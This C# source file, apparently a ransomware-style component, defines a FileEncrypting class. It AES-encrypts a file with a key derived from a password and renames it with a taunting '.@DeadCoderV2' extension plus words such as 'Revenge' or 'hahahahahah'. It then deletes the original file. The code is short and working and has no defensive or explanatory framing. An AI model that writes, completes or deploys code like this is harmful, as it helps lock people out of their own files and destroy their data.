using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;

namespace Menu1
{
    class FileEncrypting
    {
   
        public static void EncryptFile(string inputFile, string password)
        {
            byte[] key = CreateKeyFromPassword(password);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV();

    
                string randomWord = GetRandomWord();
                string encryptedFilePath = Path.ChangeExtension(inputFile, $".@DeadCoderV2{randomWord}"); 

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsEncrypted = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write))
                {
           
                    fsEncrypted.Write(aes.IV, 0, aes.IV.Length);

                    using (CryptoStream cs = new CryptoStream(fsEncrypted, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        byte[] buffer = new byte[1048576];
                        int read;
                        while ((read = fsInput.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            cs.Write(buffer, 0, read);
                        }
                    }
                }

   
                File.Delete(inputFile);
            }
        }


    private static byte[] CreateKeyFromPassword(string password)
    {
        using (SHA256 sha256 = SHA256.Create())
        {
            return sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
        }
    }


    private static string GetRandomWord()
    {
        string[] words = { "Bruh", "Revenge", "GG", "hahahahahah" };
        Random random = new Random();
        int index = random.Next(words.Length);
        return words[index];
    }
}
}
